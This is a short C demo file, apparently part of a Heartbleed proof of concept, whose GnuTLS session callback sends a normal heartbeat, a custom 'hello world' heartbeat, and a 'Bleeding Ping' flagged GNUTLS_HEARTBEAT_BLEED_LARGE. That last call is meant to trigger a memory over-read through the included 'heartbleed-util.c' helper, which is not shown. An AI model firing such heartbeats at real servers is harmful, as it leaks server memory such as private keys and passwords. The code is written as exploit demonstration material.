// See license in demo.c

#include <stdio.h>
#include <gnutls/gnutls.h>
#include "heartbleed-util.c"

void session_live_callback(gnutls_session_t session){
	// Default Ping
	send_random_heartbeat(session, 0);

	// Custom Ping
	char hello[11] = "hello world";
	send_custom_heartbeat(session, hello, 0);

	// Bleeding Ping
	char arrows[6] = ">>>>>>";
	send_custom_heartbeat(session, arrows, GNUTLS_HEARTBEAT_BLEED_LARGE);
}
